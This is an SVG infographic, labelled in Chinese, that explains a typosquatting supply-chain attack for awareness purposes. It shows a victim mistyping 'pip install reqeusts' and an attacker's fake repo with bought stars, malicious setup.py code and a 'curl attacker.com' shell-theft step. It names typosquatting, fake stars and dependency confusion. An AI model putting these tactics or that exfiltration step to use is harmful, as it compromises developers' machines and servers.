<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 480">
  <defs>
    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#FAF9F5"/>
      <stop offset="100%" style="stop-color:#E3DACC"/>
    </linearGradient>
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="2" dy="3" stdDeviation="3" flood-color="#141413" flood-opacity="0.15"/>
    </filter>
  </defs>
  <rect width="800" height="480" fill="url(#bg)"/>

  <!-- Title -->
  <text x="400" y="38" text-anchor="middle" font-family="system-ui,-apple-system,sans-serif" font-size="20" font-weight="700" fill="#141413">攻击者的 Playbook：Typosquatting 流程</text>

  <!-- Victim side -->
  <rect x="40" y="70" width="180" height="320" rx="12" fill="#FAF9F5" stroke="#D1CFC5" stroke-width="2" filter="url(#shadow)"/>
  <text x="130" y="100" text-anchor="middle" font-family="system-ui,sans-serif" font-size="14" font-weight="600" fill="#141413">受害者</text>

  <!-- Terminal -->
  <rect x="55" y="115" width="150" height="70" rx="6" fill="#141413"/>
  <text x="65" y="140" font-family="monospace" font-size="11" fill="#E3DACC">$ pip install</text>
  <text x="65" y="158" font-family="monospace" font-size="11" fill="#D97757">  reqeusts</text>
  <text x="65" y="176" font-family="monospace" font-size="9" fill="#87867F">  ↑ 拼写错误</text>

  <!-- Brain -->
  <circle cx="130" cy="245" r="28" fill="#E3DACC"/>
  <text x="130" y="240" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#141413">确认偏误</text>
  <text x="130" y="254" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#141413">"对的，就是这个"</text>

  <!-- Trust arrow -->
  <rect x="90" y="285" width="80" height="22" rx="11" fill="#788C5D"/>
  <text x="130" y="300" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#FAF9F5">GitHub = 安全</text>

  <!-- Oops -->
  <text x="130" y="365" text-anchor="middle" font-family="system-ui,sans-serif" font-size="12" fill="#D97757" font-weight="600">💀 服务器被接管</text>

  <!-- Attack side -->
  <rect x="580" y="70" width="180" height="320" rx="12" fill="#FAF9F5" stroke="#D97757" stroke-width="2" filter="url(#shadow)"/>
  <text x="670" y="100" text-anchor="middle" font-family="system-ui,sans-serif" font-size="14" font-weight="600" fill="#D97757">攻击者</text>

  <!-- Fake repo -->
  <rect x="595" y="120" width="150" height="80" rx="6" fill="#FAF9F5" stroke="#D97757" stroke-width="1.5"/>
  <text x="670" y="145" text-anchor="middle" font-family="system-ui,sans-serif" font-size="12" fill="#141413">⭐ 1,247 stars</text>
  <text x="670" y="163" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#87867F">reqeusts</text>
  <text x="670" y="180" text-anchor="middle" font-family="monospace" font-size="9" fill="#D97757">上周创建 · $50 购买</text>

  <!-- Malware -->
  <rect x="605" y="215" width="120" height="40" rx="6" fill="#D97757"/>
  <text x="665" y="240" text-anchor="middle" font-family="system-ui,sans-serif" font-size="12" fill="#FAF9F5">setup.py</text>
  <text x="665" y="253" text-anchor="middle" font-family="monospace" font-size="9" fill="#FAF9F5">恶意代码隐藏其中</text>

  <!-- Exfiltration -->
  <rect x="605" y="270" width="120" height="40" rx="6" fill="#141413"/>
  <text x="665" y="290" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#FAF9F5">curl attacker.com</text>
  <text x="665" y="303" text-anchor="middle" font-family="monospace" font-size="9" fill="#D97757">shell 窃取</text>

  <!-- Price tag -->
  <rect x="595" y="325" width="150" height="40" rx="6" fill="#E3DACC"/>
  <text x="670" y="345" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#141413">$50 = 500 stars</text>
  <text x="670" y="358" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#87867F">信任商品化</text>

  <!-- Arrow between -->
  <path d="M230 200 C 320 160, 480 160, 570 200" stroke="#D97757" stroke-width="2.5" fill="none" stroke-dasharray="8,4"/>
  <polygon points="570,195 580,200 570,205" fill="#D97757"/>
  <text x="400" y="155" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#D97757">安装恶意包</text>

  <!-- Attack types at bottom -->
  <rect x="270" y="410" width="260" height="50" rx="8" fill="#FAF9F5" stroke="#141413" stroke-width="1.5"/>
  <text x="400" y="432" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#141413">攻击手段：拼写劫持 | 虚假 Star | 依赖混淆</text>
  <text x="400" y="450" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#87867F">伪装流行项目 · 植入恶意代码 · 购买信任信号</text>
</svg>